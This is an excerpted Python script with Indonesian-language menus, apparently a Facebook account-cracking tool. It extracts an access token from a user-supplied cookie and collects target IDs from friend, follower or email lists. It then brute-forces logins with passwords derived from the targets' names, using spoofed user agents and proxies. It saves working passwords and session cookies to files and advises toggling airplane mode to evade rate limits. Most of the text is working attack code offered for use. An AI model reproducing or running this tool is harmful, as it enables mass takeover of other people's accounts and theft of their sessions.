...
for xd in range(10000):
	...
	f='Mozilla/5.0 (linux; U; Android 6;  en-us; GT-P902L)AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4256.60 Mobile Safari/537.36'
	...
	l='Mobile Safari/537.36 OPR/49.2.2361.134358'
...
akun_ok = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
akun_cp = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
#------------------[ MACHINE-SUPPORT ]---------------#
def luxine_123(u):
...
def login_lagi334():
	try:
		...
		luxine_123(f'SELAMAT DATANG {H}SAYANG{P} ADA YANG BISA DI BANTU?\n\tTEKEN Y UNTUK MELANJUTKAN CRACK')
		yataut = input(f'{P}  [{H}√{P} pilih masukan : ')
		kode = input(f'{P}  [{H}√{P}] masukan kode scrip hubungi pihak script bila tidak tau kode ini!!! : ')
		cookie=input(f'[√] Masukkan Cookies :{asu} ')
		data = requests.get("https://business.facebook.com/business_locations", headers = {"user-agent": "Mozilla/5.0 (Linux; Android 8.1.0;  en-us; I1927 Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.4562.135 Mobile Safari/537.36 Instagram 180.0.0.31.119 Android (30/11; 480dpi; 1080x2310; vivo/iQOO; I1927; I1928; qcom; ","referer": "https://www.facebook.com/","host": "business.facebook.com","origin": "https://business.facebook.com","upgrade-insecure-requests" : "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","cache-control": "max-age=0","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8","content-type":"text/html; charset=utf-8"}, cookies = {"cookie":cookie}) 
		find_token = re.search("(EAAG\w+)", data.text)
		ken=open(".token.txt", "w").write(find_token.group(1));bot()
		cok=open(".cok.txt", "w").write(cookie)
		print(f'  {x}[{h}✓{x}]{h} LOGIN KAMU TELAH DI SETUJU OLEH PIHAK SCRIPT{x} ');time.sleep(1)
		exit()
	except Exception as e:
		os.system("rm -f .token.txt")
		os.system("rm -f .cok.txt")
		print(f'  %s[%sx%s]%s MAAF LOGIN KAMU BELUM BISA DI SETUJUI%s'%(x,k,x,m,x))
		exit()
def bot():
	try:
...
def menu(my_name,my_id):
	...
	luxine_123(f'{P}[{H}•{P}]  YOU IP ADDRES : {H}{ip}{P})')
	luxine_123(f'{P}[{H}•{P}]  YOUR COOKIE COLLECTION ADDRESS : {H}Cookiedough{P})')
	luxine_123(f'{P}[{H}•{P}]  FILE NAME COOKIE && TOKEN : {H}lux_tok.txt && lux_cok.txt{P})')
	luxine_123(f'{P}[{H}•{P}]  FACEBOOK ADMIN : {H}luxine indah{P})')
	print('')
	print(f'{P}[{H}•{P}] 1. BUKA MENU CRACK #FB')
	print(f'{P}[{H}•{P}] 2. BUKA MENU BOT #FB')
	print(f'{P}[{H}•{P}] 0. KELUAR')
	luxine___xd = input(f'\n{P}({M}?{P}) Pilih : ')
	if luxine___xd in ['1']:
	    crackfb()
	elif luxine___xd in ['2']:
		menuof()
	elif luxine___xd in ['0']:
		tanya_tanya = input(f'{M} INGIN PENGHAPUS COOKIES? {M}y{P}/{H}t {P}: ')
		if tanya_tanya in ['t','T']:
		    luxine___123(f'{P} SELAMAT TINNGAL {H}{my_name} {P}SAYANG')
		elif tanya_tanya in ['y','Y']:
...
def crackfb():
    luxine___123 = print
    luxine___123(f'{P}[{H}-{P}] SELAMAT DATANG {H}SAYANG DI MENU CRACK\n')
    print(f'\n{P}[{H}•{P}] 1. crack list pertemenan publick/{H}non massal/limit 1{P}')
    print(f'{P}[{H}•{P}] 2. crack list pertemenan publick/{H}massal/ultimed{P}\n')
    print(f'{P}[{H}•{P}] 3. crack list pengikut')
    print(f'{P}[{H}•{P}] 4. crack list gmail/email')
    print(f'\n{P}[{H}•{P}] 5. cek hasil crack')
    print(f'{P}[{H}•{P}] 0. keluar')
    kamu_nanya = input(f'\n{P}({M}?{P}) PILIH MENU CRACKFB : ')
...
def masal_z():
	try:
		...
		exit()
	try:
		jum = int(input(f'{P}({M}?{P}) MAU BERAPA ID SAY? :'))
	except ValueError:
		exit()
	if jum<1 or jum>100:
		exit()
	...
	for met in range(jum):
		yz+=1
		kl = input(f'{P}({M}?{P}) saya nanya id '+str(yz)+' nya mana : ')
		uid.append(kl)
	for userr in uid:
		try:
	...
	try:
		print('')
		print(f'{P}[{H}CUAX{P}] TOTAL AKUN YANG AKAN DI CRACK {h}'+str(len(id)))
		setting()
	except requests.exceptions.ConnectionError:
		print(f'{x}')
		back()
...
def grup1(urls):
	...
	while True:
		try:
			ua = 'Mozilla/5.0 (Linux; U; Android 7.1.1; en-US; MI MAX 2 Build/NMF26F) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.108 UCBrowser/13.3.5.1304 Mobile Safari/537.36'
			miskinlu = {"user-agent": ua}
			try:
				url = use[0]
			except:
...
def crack_file():
	...
	if len(vin)==0:
		...
		try:geh = lol[geeh]
			...
			print(f'{k}>> Pilih Yang Bener Sayang {x}')
			time.sleep(3)
			back()
...
def setting():
	print(f'\n{P}[{H}•{P}] 1. {P}({P}old{M}×{P})')
	print(f'{P}[{H}•{P}] 2. {P}({P}old {M}V2×{P})')
	print(f'\n{P}[{H}•{P}] 3. ({P}new{H}✓{P}) ')
	print(f'{P}[{H}•{P}] 4. ({P}new {H}V2✓{P})')
	hu = input(f'{P}({M}?{P}) Pilih : ')
	if hu in ['1','2']:
		...
		exit()
	print(f'\n{P}[{H}•{P}] 1. {P}b-api)')
	print(f'{P}[{H}•{P}] 2. {P}mbasic)')
	print('')
	hc = input(f'{P}({M}?{P}) Pilih : ')
	if hc in ['1','01']:
		method.append('b-api')
	elif hc in ['']:
		setting()
		...
		method.append('b-api')
	print('')
	_jembot_ = input(f'{P}({H}?{P}) GUNAKAN PROXY? {M}y{P}/{H}t {P}: ')
	cetak(nel("""[white][[green]•[white]] 1. password manual\n[white][[green]•[white]] 2.password name,name123\n[white][[green]•[white]] 3. password name,name123,name1234\n[white][[green]•[white]] 4. name,name123,name1234,name12346"""))
	if _jembot_ in ['']:
		back()
		...
		taplikasi.append('no')
	pwplus=input(f'{P}{P}({M}?{P}) PILIH : ')
	if pwplus in ['1','1']:
		pwpluss.append('ya')
		cetak(nel('[[cyan]•[white]] Masukkan password tambah contoh bogor,bandung,maung'))
		pwku=input('{P}({M}?{P}) PILIH : ')
		pwkuh=pwku.split(',')
		for xpw in pwkuh:
			pwnya.append(xpw)
	else:
...
def passwrd():
	luxine___123 = print
	luxine___123(f'{P}[{B}><{P}] GUNAKAN MODE PESAWAT SETIAP 500ID')
	luxine___123(f'{P}hasil {H}ok{P} di simpan di folder {H}{akun_ok}\n{P}hasil {K}cp{P} di simpan di folder {K}{akun_cp}{P}')
...
def crack(idf,pwv):
	...
	sys.stdout.write(f"\r{P}({K}{loop}{P}/{bo}{len(id)}{P}) {P}({H}{ok}{P}) {P}({k}{cp}{x}) ({bo}{'{:.0%}'.format(loop/float(len(id)))}{P})  "),
	sys.stdout.flush()
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'\n{x}({H}+{P}) {K}ID/USER : {idf}{N}')
				print(f'{x}({K}+{P}) {K}PASWORD : {pw}')
				print(f'{x}({K}+{P}) USER UA : {uaku}')
				open('CP/'+akun_cp,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				headapp={"user-agent":"Mozilla/5.0 (linux; U; Android 6;  en-us; GT-P902L)AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4256.60 Mobile Safari/537.36"}
				if 'no' in taplikasi:
					ok+=1
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					print(f'\r{x}({H}+{P}) {H}USER/ID : {idf}')
					print(f'{x}({H}+{P}) {H}PASWORD : {pw}')
					print(f'{x}({H}+{P}) {H}COOKIE : {kuki}')
					open('OK/'+akun_ok,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					break
